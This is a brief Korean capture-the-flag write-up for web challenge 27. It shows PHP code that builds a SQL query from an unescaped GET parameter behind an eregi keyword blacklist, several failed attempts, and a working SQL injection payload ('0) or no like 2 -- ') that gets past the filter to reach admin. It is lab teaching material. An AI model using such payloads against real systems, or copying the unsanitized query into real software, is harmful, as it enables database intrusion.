# 27

### First impression
```php
if($_GET[no])
{

if(eregi("#|union|from|challenge|select|\(|\t|/|limit|=|0x",$_GET[no])) exit("no hack");

$q=@mysql_fetch_array(mysql_query("select id from challenge27_table where id='guest' and no=($_GET[no])")) or die("query error");

if($q[id]=="guest") echo("guest");
if($q[id]=="admin") @solve();

}
```

### Trial and error
* `select id from challenge27_table where id='guest' and no=($_GET[no])`
* `TRUE and FALSE or TRUE = TRUE`
	- `and` 연산자가 `or` 연산자보다 우선순위가 더 높은 것을 이용하여 `TRUE` 유도.
* [RegExr](https://regexr.com/)에서 정규표현식 검사 후 `?no=` 파라미터로 넘김.
	- `2)+or+id='admin'--` 통과 못함. `=` 걸림.
	- `2)+or+id+like+'admin'--` 통과함. `query error`.
	- `2)+or+id+like+'admin%'--` 통과함. `query error`.
	- `1)--` 통과함. `query error`.
	- 앞에 `%00` 먼저 써도 `eregi()` 우회 불가능.
	- `2)+or+id+<>+'admin' --` 통과함. `query error`.
* `id` 대신 `no`로 해보는게 어떨까? `no`가 테이블의 기본키일 가능성이 높고, 기본키는 `1`부터 `1`씩 차례대로 증가하니까 아마 `admin`은 `2`일 가능성이 높다.
	- `2) or no like 2 --` 통과함. `query error`.
* 결국 검색했다... 겨우 띄어쓰기 하나 때문에 통과를 못했던 것이다.

### Solution
* `0) or no like 2 -- `. 반드시 `--` 뒤의 띄어쓰기를 해주어야 주석처리가 된다.